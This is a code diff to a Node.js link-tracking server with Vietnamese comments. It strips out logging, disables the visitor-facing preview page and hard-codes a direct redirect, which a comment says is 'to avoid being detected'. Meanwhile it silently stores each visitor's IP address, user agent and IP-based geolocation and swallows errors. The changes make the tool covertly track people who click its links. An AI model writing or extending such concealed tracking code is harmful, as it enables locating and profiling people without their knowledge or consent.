@@ -75,7 +75,7 @@ db.run(`
 
 // Migration function để cập nhật database schema
 function migrateDatabase() {
-  console.log('🔄 Checking database schema...');
+  // Checking database schema silently
   
   // Tạo bảng migration để track các migration đã chạy
   db.run(`CREATE TABLE IF NOT EXISTS migrations (
@@ -92,12 +92,12 @@ function migrateDatabase() {
     }
     
     if (migration) {
-      console.log('✅ Migration already completed');
+      // Migration already completed
       return;
     }
     
     // Chạy migration an toàn
-    console.log('🚀 Running database migration...');
+    // Running database migration silently
     
     // Function để thêm cột an toàn
     const addColumnSafely = (columnName, columnDef, callback) => {
@@ -263,12 +263,11 @@ app.post('/api/create-link', (req, res) => {
   if (expiresIn && expiresIn > 0) {
     expiresAt = new Date(Date.now() + expiresIn * 24 * 60 * 60 * 1000).toISOString();
   }
-  
-  db.run(
+    db.run(
     `INSERT INTO tracking_links 
      (link_id, short_path, name, original_url, custom_domain, preview_enabled, password, expires_at) 
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
-    [linkId, shortPath, name, originalUrl, domain, enablePreview ? 1 : 0, password || null, expiresAt],
+    [linkId, shortPath, name, originalUrl, domain, 0, password || null, expiresAt],
     function(err) {
       if (err) {
         if (err.message.includes('UNIQUE')) {
@@ -278,7 +277,7 @@ app.post('/api/create-link', (req, res) => {
             `INSERT INTO tracking_links 
              (link_id, short_path, name, original_url, custom_domain, preview_enabled, password, expires_at) 
              VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
-            [linkId, shortPath, name, originalUrl, domain, enablePreview ? 1 : 0, password || null, expiresAt],
+            [linkId, shortPath, name, originalUrl, domain, 0, password || null, expiresAt],
             function(err2) {
               if (err2) {
                 console.error(err2);
@@ -372,22 +371,11 @@ async function processTracking(req, res, link) {
     if (clientIP && clientIP.substr(0, 7) === '::ffff:') {
       clientIP = clientIP.substr(7);
     }
+      const userAgent = req.headers['user-agent'];
     
-    const userAgent = req.headers['user-agent'];
-    
-    // Debug log
-    console.log('=== TRACKING DEBUG ===');
-    console.log('Raw IP:', req.connection.remoteAddress);
-    console.log('X-Forwarded-For:', req.headers['x-forwarded-for']);
-    console.log('X-Real-IP:', req.headers['x-real-ip']);
-    console.log('Final Client IP:', clientIP);
-    console.log('User Agent:', userAgent);
-    console.log('======================');
-    
-    // Lấy thông tin vị trí từ IP
+    // Thu thập thông tin âm thầm (không log ra console)    // Lấy thông tin vị trí từ IP
     let ipInfo;
     if (clientIP === '::1' || clientIP === '127.0.0.1' || clientIP.startsWith('192.168.') || clientIP.startsWith('10.')) {
-      console.log('🏠 Local/Private IP detected - Using demo IP for testing');
       // Sử dụng IP demo để test (IP của Google)
       ipInfo = await getIPInfo('8.8.8.8');
       if (ipInfo) {
@@ -395,7 +383,6 @@ async function processTracking(req, res, link) {
         ipInfo.realIP = clientIP;
       }
     } else {
-      console.log('🌐 Public IP detected - Getting real location');
       ipInfo = await getIPInfo(clientIP);
     }
     
@@ -414,22 +401,12 @@ async function processTracking(req, res, link) {
     
     db.run(`
       INSERT INTO visits (link_id, ip_address, user_agent, latitude, longitude, country, city, region, timezone)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `, Object.values(visitData), (err) => {
-      if (err) console.error('Error saving visit:', err);
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)    `, Object.values(visitData), (err) => {
+      // Âm thầm bỏ qua lỗi
     });
     
-    // Hiển thị trang tracking hoặc redirect trực tiếp
-    if (link.preview_enabled) {
-      res.render('tracking', {
-        link,
-        visit: visitData,
-        requestLocation: true
-      });
-    } else {
-      // Redirect trực tiếp không hiển thị trang tracking
-      res.redirect(link.original_url);
-    }
+    // Redirect trực tiếp không hiển thị trang tracking để tránh bị phát hiện
+    res.redirect(link.original_url);
 }
 
 // API lấy vị trí từ GPS (JavaScript geolocation)
@@ -549,5 +526,5 @@ app.post('/api/test-real-ip', async (req, res) => {
 migrateDatabase();
 
 app.listen(PORT, () => {
-  console.log(`Server đang chạy tại http://localhost:${PORT}`);
+  console.log(`Server started on port ${PORT}`);
 });
